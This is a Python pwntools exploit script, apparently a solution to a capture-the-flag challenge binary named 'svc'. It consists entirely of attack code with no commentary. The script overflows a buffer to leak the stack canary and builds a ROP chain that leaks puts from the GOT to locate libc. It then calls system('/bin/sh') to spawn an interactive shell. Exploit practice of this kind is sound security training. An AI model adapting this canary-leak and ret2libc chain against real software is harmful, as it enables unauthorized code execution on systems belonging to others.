from pwn import *

gdbcmds = '''
b *0x400a96
b *0x400cce
b *0x00400ddf
c
'''

elf = context.binary = ELF("./svc")
libc = elf.libc
#target = gdb.debug('./svc', gdbscript=gdbcmds)
target = process("./svc")

target.recvuntil(b">>")
target.sendline(b"1")

target.recvuntil(b">>")
payload = b"\x90"*169
target.send(payload)

target.recvuntil(b">>")
target.sendline(b"2")

target.recvuntil(b"\x90")
canary = target.recvline()
canary = canary[-9:-2]
canary = u64(b"\x00"+canary)
print("Leak:", hex(canary))

target.recvuntil(b">>")
target.sendline(b"1")

payload = b""
payload += b"\x90"*168
payload += p64(canary)
payload += b"\x90"*8
payload += p64(0x0000000000400ea3) # pop rdi; ret
payload += p64(0x602018)	   # puts got
payload += p64(0x004008d0)	   # puts plt
payload += p64(0x00400a96)	   # main
target.recvuntil(b">>")
target.sendline(payload)

target.recvuntil(b">>")
target.sendline(b"3")

target.recvuntil(b"MIENRALS...")
target.recvline()
puts_leak = target.recvline().strip()
puts_leak = puts_leak+b"\x00"*(8-len(puts_leak))
puts_leak = u64(puts_leak)
print("Libc leak:", hex(puts_leak))


print(target.recvuntil(b">>"))
target.sendline(b"1")

libc.address = puts_leak - libc.sym.puts
payload = b""
payload += b"\x90"*168
payload += p64(canary)
payload += b"\x90"*8
payload += p64(0x00000000004008b1) # ret
payload += p64(0x0000000000400ea3) # pop rdi; ret
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym.system)

print(target.recvuntil(b">>"))
target.sendline(payload)

target.recvuntil(b">>")
target.sendline(b"3")

target.interactive()
